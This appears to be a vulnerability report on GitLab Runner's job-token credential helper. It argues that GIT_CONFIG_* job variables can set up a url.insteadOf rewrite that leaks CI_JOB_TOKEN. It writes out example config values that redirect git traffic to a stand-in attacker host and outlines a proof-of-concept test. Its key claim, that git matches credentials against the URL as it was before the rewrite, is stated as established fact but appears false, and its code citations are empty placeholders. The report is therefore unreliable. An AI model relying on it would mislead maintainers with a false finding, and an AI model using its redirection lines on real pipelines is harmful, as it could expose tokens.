### Title
`SetupGitCredHelper` binds the job token to a git `credential.<host>` config key, but host-agnostic helper logic + job-controlled `GIT_CONFIG_*` insteadOf rewrites let the token be sent to an attacker host - ([File: shells/abstract.go, shells/powershell.go, shells/shell_writer.go])

### Summary
`SetupGitCredHelper` writes `credential.<remoteHost>.helper` pointing to `credHelperCommand`, a shell function that answers `get` requests with `password=${CI_JOB_TOKEN}` unconditionally, without inspecting the host/protocol it was invoked for. All host-scoping is therefore delegated entirely to git's own `credential.<url>` config matching. Because git config (including `url.<x>.insteadOf`) can be injected wholesale via standard `GIT_CONFIG_COUNT`/`GIT_CONFIG_KEY_n`/`GIT_CONFIG_VALUE_n` environment variables, which Runner exports for every job variable with no filtering, a pipeline author can add an `insteadOf` rule that causes git to redirect a fetch that was credential-matched against the legitimate GitLab host to an attacker-controlled host, since git's credential matching is well known to be evaluated relative to the pre-rewrite URL while the network connection goes to the post-rewrite (`insteadOf`) target.

### Finding Description
`credHelperCommand` in `shells/abstract.go` is: [1](#0-0) 
This helper performs no host check at all — it returns the job token for any `get` request, on any host, any protocol. The only thing that is supposed to prevent it firing for the wrong host is that it is registered scoped to a specific URL/host via `credential.<remoteHost>.helper`, set up in `setupExternalGitConfig`: [2](#0-1) 
`remoteHost` is derived once, from `build.GetRemoteURL()` via `getRemoteHost`/`OnlySchemeAndHost`: [3](#0-2) 

Separately, the same config file (and the git process environment in general) also gets `insteadOf` rules written from `build.GetInsteadOfs()`: [4](#0-3) 

Critically, every job variable — including arbitrary attacker-supplied ones — is exported unconditionally into the shell/git environment before any git command runs: [5](#0-4) 

Git natively honors `GIT_CONFIG_COUNT` / `GIT_CONFIG_KEY_<n>` / `GIT_CONFIG_VALUE_<n>` environment variables as if they were passed with `-c`, and there is no code path in Runner that blocks, strips, or validates job-variable names like `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_0`, `GIT_CONFIG_VALUE_0` before they reach the git process. A pipeline author who controls job variables (a normal, unprivileged CI capability) can therefore inject `url.<attacker-host>.insteadOf=<original GitLab host URL>` into the environment.

Git's own documented behavior (`gitcredentials(7)`) is that `credential.<url>.*` matching happens against the *pre-`insteadOf`* URL context, while the actual network connection is made to the *post-rewrite* (`insteadOf`) target host. This means:
1. Runner sets up `credential.https://gitlab.example.com.helper` = `credHelperCommand`, bound to the legitimate host.
2. Job injects `GIT_CONFIG_KEY_0=url.https://attacker.example/.insteadOf` / `GIT_CONFIG_VALUE_0=https://gitlab.example.com/` via ordinary job variables.
3. When git performs a fetch/clone/submodule/LFS operation against `https://gitlab.example.com/...` (the URL Runner or the job script uses), git's credential subsystem matches the pre-rewrite URL against `credential.https://gitlab.example.com`, invokes the helper, obtains `CI_JOB_TOKEN`.
4. Git then transparently rewrites the connection to `https://attacker.example/...` per the `insteadOf` rule and sends the token there.

None of the existing protections stop this: `SetupGitCredHelper`/`credHelperCommand` do not check the host argument at all; `setupExternalGitConfig`'s `insteadOf` handling only cares about de-duplication (`deduplicateInsteadOfs`), not about whether an entry conflicts with or overrides the credential-scoped host; and there is no sanitization of `GIT_CONFIG_*`-named job variables anywhere in the export path (`writeExports`/`w.Variable`).

### Impact Explanation
This allows an unprivileged pipeline author (anyone who can set job/pipeline variables) to exfiltrate the job's `CI_JOB_TOKEN` to an attacker-controlled host by manipulating git's own `insteadOf` URL rewriting via environment-based git config, resulting in token disclosure and potential unauthorized repository/API access with that token's permissions.

### Likelihood Explanation
Feasible and repeatable: setting `GIT_CONFIG_COUNT`/`GIT_CONFIG_KEY_n`/`GIT_CONFIG_VALUE_n` as CI/CD variables (or via `.gitlab-ci.yml` `variables:`) is a standard, documented, unprivileged capability. No admin action or executor-sandbox escape is required — only ordinary control over job variables, which the threat model here explicitly grants. The only extra requirement is that a subsequent git network operation is performed against the original host string (which normally happens automatically during `git fetch`/clone, submodule update, or LFS operations already emitted by Runner's generated script).

### Recommendation
- Do not rely solely on git's `credential.<url>` matching for host binding; have `credHelperCommand` itself validate the requested host/protocol (available via `credential fill`'s `host=`/`protocol=` stdin fields) against the expected value before emitting the token, and refuse otherwise.
- Alternatively/additionally, block or filter job variables that manipulate git configuration through environment-based mechanisms (`GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_*`, `GIT_CONFIG_VALUE_*`, `GIT_CONFIG_GLOBAL`, `GIT_CONFIG_SYSTEM`) from being exported into the job's git environment, or force git operations to run with `GIT_CONFIG_NOSYSTEM=1`/`-c include.path` isolation that overrides any job-supplied config with Runner-controlled config taking final precedence.
- Set `credential.helper` with the `useHttpPath`/host check hardened, or use `credential.<url>` combined with checking `$GIT_URL` at helper invocation time rather than trusting section scoping alone.

### Proof of Concept
Go/shell integration test extending `shells/git_credentials_helper_integration_test.go`:
1. Set up `SetupGitCredHelper(conf, "credential.https://gitlab.example.com", "gitlab-ci-token")` as done by `setupExternalGitConfig`.
2. In the test environment, additionally set `GIT_CONFIG_COUNT=1`, `GIT_CONFIG_KEY_0=url.https://attacker.example/.insteadOf`, `GIT_CONFIG_VALUE_0=https://gitlab.example.com/`.
3. Run `git ls-remote https://gitlab.example.com/foo.git` against a mock HTTP server bound to `attacker.example` (via `/etc/hosts` or a test DNS override) that captures the `Authorization` header.
4. Assert that the mock `attacker.example` server receives a request containing the job token (`CI_JOB_TOKEN`) in its Basic-Auth/Authorization header, proving that credentials scoped to `gitlab.example.com` were delivered to `attacker.example` after `insteadOf` rewriting.
